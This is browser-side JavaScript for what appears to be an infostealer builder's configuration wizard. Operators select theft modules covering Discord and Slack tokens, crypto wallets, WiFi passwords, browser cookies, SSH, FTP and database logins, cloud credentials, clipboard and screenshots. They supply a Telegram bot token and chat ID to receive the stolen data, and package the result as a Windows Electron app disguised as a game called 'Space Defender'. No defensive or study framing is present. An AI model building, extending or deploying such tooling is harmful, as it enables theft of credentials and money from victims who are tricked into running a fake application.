const MODULES = [
  ['discord_tokens', 'Token Grabber (Discord, Slack)'],
  ['crypto_wallets', 'Crypto Wallet Scanner'],
  ['wifi_passwords', 'WiFi Passwords'],
  ['system_info', 'System Info Collector'],
  ['geolocation', 'Location / IP Info'],
  ['browser_data', 'Browser Data (cookies, history)'],
  ['clipboard', 'Clipboard Monitor'],
  ['screenshots', 'Screenshot Capture'],
  ['app_creds', 'App Credentials (SSH, FTP, DB)'],
  ['messenger', 'Messenger Data (Signal, Slack)'],
  ['cloud_creds', 'Cloud Credentials (AWS, Azure, GCP)'],
  ['steam_epic', 'Gaming Platforms (Steam, Epic)'],
]

let currentStep = 0
let selectedModules = MODULES.filter(m => ['discord_tokens','crypto_wallets','wifi_passwords','system_info','geolocation','browser_data','clipboard','screenshots'].includes(m[0])).map(m => m[0])

function toast(msg) {
  const el = document.createElement('div')
  el.className = 'toast'
  el.textContent = msg
  document.getElementById('toasts').appendChild(el)
  setTimeout(() => el.remove(), 3500)
}

function renderModules() {
  const el = document.getElementById('modules')
  el.innerHTML = ''
  for (const [id, name] of MODULES) {
    const div = document.createElement('div')
    const on = selectedModules.includes(id)
    div.className = 'mod' + (on ? ' on' : '')
    div.innerHTML = `<div class="mcheck">${on ? '✓' : ''}</div><div class="mname">${name}</div>`
    div.onclick = () => {
      const idx = selectedModules.indexOf(id)
      if (idx >= 0) selectedModules.splice(idx, 1)
      else selectedModules.push(id)
      renderModules()
    }
    el.appendChild(div)
  }
}

function showStep(n) {
  currentStep = n
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'))
  document.getElementById('page-' + n).classList.add('active')
  document.querySelectorAll('.step').forEach((s, i) => {
    s.classList.toggle('active', i === n)
    s.classList.toggle('done', i < n)
  })
}

function next(n) {
  if (n === 0) {
    if (!document.getElementById('tgToken').value.trim()) { toast('Telegram Bot Token is required'); return }
    if (!document.getElementById('tgChatId').value.trim()) { toast('Telegram Chat ID is required'); return }
  }
  showStep(n + 1)
}

function prev(n) {
  showStep(n - 1)
}

async function startBuild() {
  document.getElementById('buildBtn').disabled = true
  document.getElementById('buildBtn').textContent = 'Building...'
  document.querySelectorAll('.bline').forEach(l => { l.className = 'bline' })
  document.getElementById('b1').classList.add('active')

  const data = {
    tgToken: document.getElementById('tgToken').value.trim(),
    tgChatId: document.getElementById('tgChatId').value.trim(),
    panelUrl: document.getElementById('panelUrl').value.trim() || 'http://localhost:3456',
    appName: document.getElementById('appName').value.trim() || 'Space Defender',
    modules: selectedModules
  }

  setTimeout(() => { document.getElementById('b1').classList.remove('active'); document.getElementById('b1').classList.add('done'); document.getElementById('b2').classList.add('active') }, 500)

  try {
    const res = await fetch('/api/build', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
    const result = await res.json()

    document.getElementById('b1').classList.add('done')
    document.getElementById('b2').classList.add('done')
    document.getElementById('b3').classList.add('done')

    if (result.ok) {
      document.getElementById('b4').classList.add('done')
      document.getElementById('resultTitle').textContent = '✓ Build Complete!'
      document.getElementById('resultTitle').style.color = '#44cc88'
      document.getElementById('rExe').textContent = result.exe
      document.getElementById('rDir').textContent = result.dir
      document.getElementById('rMods').textContent = selectedModules.length + ' modules'
      showStep(3)
    } else {
      document.getElementById('b4').classList.add('error')
      document.getElementById('resultTitle').textContent = '✗ Build Error!'
      document.getElementById('resultTitle').style.color = '#e94560'
      document.getElementById('rExe').textContent = result.error || 'Unknown error'
      document.getElementById('rDir').textContent = result.dir
      document.getElementById('rMods').textContent = 'For manual packaging: cd ' + result.dir + ' && npx @electron/packager . "' + data.appName + '" --platform=win32 --arch=x64 --out=dist --asar'
      showStep(3)
    }
  } catch (e) {
    document.getElementById('b3').classList.add('error')
    document.getElementById('b4').classList.add('error')
    document.getElementById('resultTitle').textContent = '✗ Connection Error!'
    document.getElementById('resultTitle').style.color = '#e94560'
    document.getElementById('rExe').textContent = e.message
    document.getElementById('rDir').textContent = 'Builder server may not be running'
    showStep(3)
  }

  document.getElementById('buildBtn').disabled = false
  document.getElementById('buildBtn').textContent = '🚀 Start Build'
}

function resetAll() {
  showStep(0)
  document.querySelectorAll('.bline').forEach(l => { l.className = 'bline' })
}

renderModules()
